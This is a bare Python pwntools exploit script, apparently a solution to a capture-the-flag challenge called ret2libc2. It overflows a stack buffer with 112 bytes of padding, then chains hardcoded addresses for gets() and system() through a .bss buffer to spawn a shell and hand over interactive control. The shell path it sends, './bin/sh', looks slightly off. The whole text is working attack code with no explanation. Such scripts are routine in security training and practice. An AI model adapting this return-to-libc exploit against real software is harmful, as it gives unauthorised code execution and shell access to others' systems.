# !/usr/bin/env python
from pwn import *

p = process('./ret2libc2')
sys_addr = 0x8048490
get_addr = 0x8048460
bss_addr = 0x804A080
payload = b'A'*112 +p32(get_addr)+p32(sys_addr)+p32(bss_addr)+p32(bss_addr)
p.sendline(payload)
p.sendline('./bin/sh')
p.interactive()